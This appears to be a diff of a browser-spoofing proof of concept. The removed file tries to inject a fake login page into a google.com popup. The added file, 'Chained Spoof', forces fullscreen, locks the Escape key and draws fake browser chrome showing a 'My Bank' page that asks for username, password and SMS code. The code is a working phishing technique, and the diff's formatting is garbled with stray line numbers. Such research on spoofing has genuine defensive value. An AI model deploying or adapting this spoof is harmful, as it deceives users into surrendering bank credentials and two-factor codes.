@@ -1,124 +1,56 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-<meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>Browser Security Demo</title>
-
-<style>
-*{margin:0;padding:0;box-sizing:border-box;}
-
-html,body{
-width:100%;
-height:100%;
-font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif;
-background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);
-}
-
-body{
-display:flex;
-justify-content:center;
-align-items:center;
-flex-direction:column;
-gap:30px;
-padding:20px;
-}
-
-.container{
-background:white;
-padding:40px;
-border-radius:12px;
-box-shadow:0 10px 40px rgba(0,0,0,0.3);
-max-width:600px;
-text-align:center;
-}
-
-h1{color:#333;margin-bottom:20px;font-size:28px;}
-
-.demo-button{
-padding:15px 30px;
-font-size:18px;
-border-radius:8px;
-background-color:#667eea;
-color:white;
-border:none;
-cursor:pointer;
-box-shadow:0 4px 15px rgba(102,126,234,0.4);
-}
-
-.flag-hunt{
-background:#f0f0f0;
-padding:20px;
-border-radius:8px;
-margin-top:20px;
-font-family:monospace;
-}
-</style>
-</head>
-
-<body>
-
-<div class="container">
-<h1>🔒 Browser Security Demonstration</h1>
-
-<button class="demo-button" onclick="safeDemo()">POC</button>
-
-<div class="flag-hunt">
-<strong>Browser Blank Address Bar Lead Spoof</strong>
-</div>
-
-</div>
-
-<script>
-
-function addMetaRefresh() {
-  var meta = document.createElement("meta");
-  meta.httpEquiv = "refresh";
-  meta.content = "0;url=https://example.com";
-  document.head.appendChild(meta);
-}
-
-function safeDemo() {
-
-  // meta refresh on main page
-  addMetaRefresh();
-
-  // open popup
-  let win = window.open("https://www.google.com/", "_blank");
-
-  setTimeout(() => {
-
-    try {
-
-      win.document.write(`
-<h1>This is not Google!</h1>
-
-<button onclick="
-let username = prompt('Enter your username');
-let password = prompt('Enter your password');
-alert('Your creds:\\nUsername: ' + username + '\\nPassword: ' + password);
-">
-Click me
-</button>
-
-`);
-
-      win.document.close();
-
-      console.log("Content injection succeeded");
-
-    } catch (e) {
-
-      console.warn("Blocked by browser protections:", e);
-      alert("Browser security blocked the injection");
-
-    }
-
-  },50);
-
-}
-
-</script>
-
-</body>
-</html>
+<!DOCTYPE html>                                                                                                                                                                              
+      712 +<html>                                                                                                                                                                                       
+      713 +<head><title>Chained Spoof</title></head>                                                                                                                                                    
+      714 +<body>                                                                                                                                                                                       
+      715 +<button onclick="chainedAttack()">Launch Assessment</button>                                                                                                                                 
+      716 +<script>                                                                                                                                                                                     
+      717 +async function chainedAttack() {                                                                                                                                                             
+      718 +  // Step 1: Request fullscreen                                                                                                                                                              
+      719 +  await document.documentElement.requestFullscreen();                                                                                                                                        
+      720 +                                                                                                                                                                                             
+      721 +  // Step 2: Wait for notification bubble to disappear                                                                                                                                       
+      722 +  await new Promise(r => setTimeout(r, 4500));                                                                                                                                               
+      723 +                                                                                                                                                                                             
+      724 +  // Step 3: Lock keyboard to prevent Escape                                                                                                                                                 
+      725 +  if (navigator.keyboard && navigator.keyboard.lock) {                                                                                                                                       
+      726 +    try { await navigator.keyboard.lock(['Escape']); } catch(e) {}                                                                                                                           
+      727 +  }                                                                                                                                                                                          
+      728 +                                                                                                                                                                                             
+      729 +  // Step 4: Render fake browser chrome with BitB-style popup                                                                                                                                
+      730 +  document.body.innerHTML = `                                                                                                                                                                
+      731 +    <div style="background:#dee1e6;height:100vh;">                                                                                                                                           
+      732 +      <!-- Fake tab bar -->                                                                                                                                                                  
+      733 +      <div style="background:#dee1e6;height:36px;display:flex;align-items:flex-end;padding:0 8px;">                                                                                          
+      734 +        <div style="background:#fff;border-radius:8px 8px 0 0;padding:6px 16px;font-size:13px;">                                                                                             
+      735 +          My Bank - Accounts                                                                                                                                                                 
+      736 +        </div>                                                                                                                                                                               
+      737 +      </div>                                                                                                                                                                                 
+      738 +      <!-- Fake toolbar -->                                                                                                                                                                  
+      739 +      <div style="background:#fff;height:40px;display:flex;align-items:center;padding:0 12px;gap:8px;">                                                                                      
+      740 +        <span style="cursor:pointer;">&#8592; &#8594; &#8635;</span>                                                                                                                         
+      741 +        <div style="flex:1;background:#f1f3f4;border-radius:20px;padding:6px 14px;font-size:14px;">                                                                                          
+      742 +          &#128274; https://secure.mybank.com/accounts                                                                                                                                       
+      743 +        </div>                                                                                                                                                                               
+      744 +      </div>                                                                                                                                                                                 
+      745 +      <!-- Fake page content -->                                                                                                                                                             
+      746 +      <div style="background:#fff;height:calc(100vh - 76px);overflow:auto;">                                                                                                                 
+      747 +        <div style="max-width:800px;margin:0 auto;padding:30px;">                                                                                                                            
+      748 +          <h1>Account Overview</h1>                                                                                                                                                          
+      749 +          <p>Your session has expired. Please verify your identity to continue.</p>                                                                                                          
+      750 +          <div style="background:#f9f9f9;padding:20px;border-radius:8px;margin:20px 0;max-width:400px;">                                                                                     
+      751 +            <input type="text" placeholder="Username" style="width:100%;padding:12px;margin:8px 0;border:1px solid #ddd;border-radius:4px;">                                                 
+      752 +            <input type="password" placeholder="Password" style="width:100%;padding:12px;margin:8px 0;border:1px solid #ddd;border-radius:4px;">                                             
+      753 +            <input type="text" placeholder="SMS Code" style="width:100%;padding:12px;margin:8px 0;border:1px solid #ddd;border-radius:4px;">                                                 
+      754 +            <button style="width:100%;padding:12px;background:#0066cc;color:#fff;border:none;border-radius:4px;cursor:pointer;">Verify Identity</button>                                     
+      755 +          </div>                                                                                                                                                                             
+      756 +        </div>                                                                                                                                                                               
+      757 +      </div>                                                                                                                                                                                 
+      758 +    </div>                                                                                                                                                                                   
+      759 +  `;                                                                                                                                                                                         
+      760 +                                                                                                                                                                                             
+      761 +  // Step 5: Optionally lock pointer for additional control                                                                                                                                  
+      762 +  // document.body.requestPointerLock();                                                                                                                                                     
+      763 +}                                                                                                                                                                                            
+      764 +</script>                                                                                                                                                                                    
+      765 +</body>                                                                                                                                                                                      
+      766 +</html>       
